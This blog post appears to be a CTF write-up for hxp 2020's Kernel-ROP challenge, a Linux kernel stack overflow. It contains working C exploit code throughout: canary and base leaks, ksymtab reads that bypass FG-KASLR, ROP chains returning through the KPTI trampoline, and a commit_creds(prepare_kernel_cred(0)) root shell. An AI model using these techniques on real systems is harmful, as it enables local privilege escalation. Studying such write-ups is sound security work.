---
layout: "post"
title: "Kernel-ROP hxp 2020"
date: 2021-3-01
tags: [Linux Kernel,Buffer Overflow,SMEP,SMAP,KPTI,FG-KASLR]
---

# tl;dr

+ Use the kernel Buffer overflow to defeat the hottest kernel defences.

# Reversing

The bof bug is in the plain sight (exercise for the reader to find out) so there's nothing really to reverse in this.

# Setting up the debug environment

+ Extract the `initramfs.cpio.gz` with - 

```sh
gunzip initramfs.cpio.gz
mkdir rootfs && cd rootfs
cat ../initramfs.cpio | cpio --extract
```
+ Edit the `rcS` script at `/etc/init.d` and change the `uid` of the user to `0` with `setsid /bin/cttyhack setuidgid 0 /bin/sh`.
+ Also, comment out the `echo 1` happening on `dmesg` and `kptr`. This is to view module base address and `/proc/kallsyms` also.
+ Finally, pack the initramfs with 

```sh
find . | cpio -o -H newc > ../initramfs.cpio
cd ..
gzip -f initramfs.cpio
```

+ You can also edit the `rcS` init script to calculate addresses of useful functions for you right at the beginning.

# Exploit development

## Multiple Memory Leaks

In my previous post, I have discussed about all the mitigations which are enabled in this challenge. The most annoying of them are the `SMAP` (ROP only in the kernel land) and the `FG-KASLR` (Randomize individual functions).

Hence, to leak memory, we first have to find addresses of the functions which are not effected by `FG-KASLR` (we're lucky that this mitigation doesnt randomize every kernel function). 

+ The functions from `_text` (kernel image base) to `__x86_retpoline_r15` (image base + 0x400dc6) are all uneffected by FG-KASLR.
+ `commit_creds` and `prepare_kernel_cred` do not lie in this region and hence we can't proceed directly.
+ `swapgs_restore_regs_and_return_to_usermode` is the function which sweetly defeats the `KPTI` (separation of page tables in the kernel and usermode) mitigation and thus allowing us to return to userland. To our relief, this function is also uneffected by FG-KASLR. For simplicity we will call this function as `kpti trampoline`.

So, how do we leak `commit_creds` and `prepare_kernel_cred`?

## Leaking through ksymtab

Each of these functions (commit_creds and prepare_kernel_cred) have a kernel symbol table into which their offset is stored from the kernel base.

```sh
struct kernel_symbol {
	  int value_offset;
	  int name_offset;
	  int namespace_offset;
};
```
On inspection, we find that the symbol table functions are not effected by FG-KASLR.

```sh
cat /proc/kallsyms | grep ksymtab_commit_creds
-> ffffffffb7f87d90 r __ksymtab_commit_creds
cat /proc/kallsyms | grep ksymtab_prepare_kernel_cred
-> ffffffffb7f8d4fc r __ksymtab_prepare_kernel_cred
```

Hence , we can  read the offset value of each of these symbol tables and get the addresses of the actual functions thus completely bypassing `FG-KASLR`.

## Getting necessary Leaks

Since we can read from the entire stack, we can find a lot of kernel pointers on the stack from which we can obtain kernel base.

```c
void get_leak(void){
    unsigned n = 40;
    unsigned long leak[n];
    read(fd, leak, sizeof(leak));
    canary = leak[16];
    image_base = leak[38] - 0xa157ULL;
    printf("[+] canary -> 0x%lx\n",canary);
    printf("[+] image_base -> 0x%lx\n",image_base);
}
```

Since canary is also enabled,  we leak it as well. From here , we can also offset to a few useful gadgets and functions like `kpti trampoline`.

## Leaking commit_creds

+ A few things differ from userland to kernel land buffer overflows, the very first of them is the registers popped at the end of a function. Here, we have the `canary` followed by `rbx`, `r12` and `rbp` being popped before getting to `rip`.
+ Our overflow starts immediately from overwriting `canary`.
+ So , let's script it now.

```c
void get_cred(void){
    unsigned n = 50;
    unsigned long payload[n];
    unsigned off = 16;
    ksymtab_prepare_kernel_cred = image_base + 0xf8d4fcUL;
    ksymtab_commit_creds = image_base + 0xf87d90UL;
    kpti_trampoline = image_base + 0x200f10UL + 22UL;
    pop_rax_ret = image_base + 0x4d11UL;
    mov_rax_rax_16_rbp = image_base + 0x4aadUL;

    payload[off++] = canary;
    payload[off++] = 0x0; // rbx
    payload[off++] = 0x0; // r12
    payload[off++] = 0x0; // rbp
    payload[off++] = pop_rax_ret; // return address
    payload[off++] = ksymtab_commit_creds - 0x10; // rax <- __ksymtabs_commit_creds - 0x10
    payload[off++] = mov_rax_rax_16_rbp; // rax <- [__ksymtabs_commit_creds -> offset]
    payload[off++] = 0x0; // dummy rbp
    payload[off++] = kpti_trampoline; // swapgs_restore_regs_and_return_to_usermode + 22
    payload[off++] = 0x0; // dummy rax
    payload[off++] = 0x0; // dummy rdi
    payload[off++] = (unsigned long)leak_cred;
    payload[off++] = user_cs;
    payload[off++] = user_rflags;
    payload[off++] = user_sp;
    payload[off++] = user_ss;

    puts("[*] Prepared payload to leak commit_creds()");
    ssize_t w = write(fd, payload, sizeof(payload));
    puts("[!] Should never be reached");
}
```

+ To get `offset` of `ksymtab_commit_creds`, we have used a gadget which is `mov rax, qword [rax+16] ; ret` and hence we pass `ksymtab_commit_creds-0x10`.
+ To return to a userland function, we first have to call our `kpti_trampoline`. This function initially has a lots of popping of registers and so we skip that with eyes closed.
+ Finally, we set `leak_cred` as our userland function and restore all the `EFLAGS` for smooth return to userland.
+ The `EFLAGS` are preserved by us by calling a special function before anything else, which is our `save_state` function which stores all the `EFLAGS` so that we can reuse them for returning to the userland.

```c

void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[*] Saved state");
}
```

### get_creds

With some inline assembly , we can directly move the value of `rax` which now has the offset of our `commit_creds` into a global variable.

```c
void leak_cred(){
    //using inline assembly to store value of rax into a temp variable
    __asm__(".intel_syntax noprefix;"
            "mov temp_store,rax;"
            ".att_syntax");
    commit_creds = ksymtab_commit_creds + (int)temp_store;
    printf("[+] commit_creds -> 0x%lx\n",commit_creds);
    get_pkc();
}
```

Finally , we now call the function to prepare leaking `prepare_kernel_cred`.

## Leak prepare_kernel_cred

With an exact appoach as the previous payload, we can leak prepare_kernel_cred.

```c
void get_pkc(){
    unsigned long payload[50] = {0};
    int i=0x10;
    payload[i++] = canary;
    payload[i++] = 0; //rbx
    payload[i++] = 0; //r12
    payload[i++] = 0; //rbp
    payload[i++] = pop_rax_ret;
    payload[i++] = ksymtab_prepare_kernel_cred-0x10;
    payload[i++] = mov_rax_rax_16_rbp;
    payload[i++] = 0; //pop rbp
    payload[i++] = kpti_trampoline;
    payload[i++] = 0; //pop rax
    payload[i++] = 0; //pop rdi
    payload[i++] = (unsigned long)leak_pkc;
    payload[i++] = user_cs;
    payload[i++] = user_rflags;
    payload[i++] = user_sp;
    payload[i++] = user_ss;
    puts("[*] Launching payload to leak prepare_kernel_cred!");
    write(fd,payload,sizeof(payload));
}
```

This time, we pass control to `leak_pkc` userland function.

```c

void leak_pkc(){
    __asm__(".intel_syntax noprefix;"
            "mov temp_store,rax;"
            ".att_syntax;");
    prepare_kernel_cred = ksymtab_prepare_kernel_cred + (int)temp_store;
    printf("[+] prepare_kernel_cred -> 0x%lx\n",prepare_kernel_cred);
    pkc();
}
```

And finally, we leak `prepare_kernel_cred`.

## prepare_kernel_cred(0)

We will get to our root shell in 2 stages.

+ First, we will call `prepare_kernel_cred(0)` and finally store the value of `cred_structure` into the temporary variable and then call `commit_creds` on that.

```c
void pkc(){
    unsigned long payload[50] = {0};
    int i=0x10;
    pop_rdi = image_base + 0xed00;
    printf("[*] pop_rdi = 0x%lx\n",pop_rdi);
    payload[i++] = canary;
    payload[i++] = 0; //rbx
    payload[i++] = 0; //r12
    payload[i++] = 0; //rbp
    payload[i++] = pop_rdi;
    payload[i++] = 0; //for prepare_kernel_cred(0)
    payload[i++] = 0; //gadget is pop rdi ; pop rbp ; ret
    payload[i++] = prepare_kernel_cred;
    payload[i++] = kpti_trampoline;
    payload[i++] = 0; //rax
    payload[i++] = 0; //rdi
    payload[i++] = (unsigned long)store_rax;
    payload[i++] = user_cs;
    payload[i++] = user_rflags;
    payload[i++] = user_sp;
    payload[i++] = user_ss;
    write(fd,payload,sizeof(payload));
}
```
The control is passed to `store_rax` function.

```c
void store_rax(){
    __asm__(".intel_syntax noprefix;"
            "mov temp_store,rax;"
            ".att_syntax;");
    pkc_struct = temp_store;
    printf("pkc_struct = 0x%lx\n",temp_store);
    cc();
}

```

Finally, after storing `cred_struct`, we now call `commit_creds` with our struct as argument.

```c
void cc(){
    unsigned long payload[50];
    int i=0x10;
    payload[i++] = canary;
    payload[i++] = 0; //rbx
    payload[i++] = 0; //r12
    payload[i++] = 0; //rbp
    payload[i++] = pop_rdi;
    payload[i++] = pkc_struct;
    payload[i++] = 0;
    payload[i++] = commit_creds;
    payload[i++] = kpti_trampoline;
    payload[i++] = 0;
    payload[i++] = 0;
    payload[i++] = (unsigned long)priv_esc;
    payload[i++] = user_cs;
    payload[i++] = user_rflags;
    payload[i++] = user_sp;
    payload[i++] = user_ss;
    puts("[+] Writing payload for root");
    write(fd,payload,sizeof(payload));
}
```

Finally, after executing `commit_creds(prepare_kernel_cred(0))`, we call our `pric_esc` function which gives us our sweet root shell.

```c
void priv_esc(){
    if(getuid()==0){
        puts("[+] Root!!!!");
        system("/bin/sh");
    }
    else{
        puts("[-] Something wrong");
        exit(INVALID);
    }
}
```

# Conclusion

I had a great time learning about all the mitigations by enabling them one by one to understand them better.

Full Script- [Here](https://gist.github.com/PwnVerse/717604fae0f1fcbc4afa6e9878860dce)

## References

+ [An Awesome Blog post](https://lkmidas.github.io/posts/20210205-linux-kernel-pwn-part-3/)
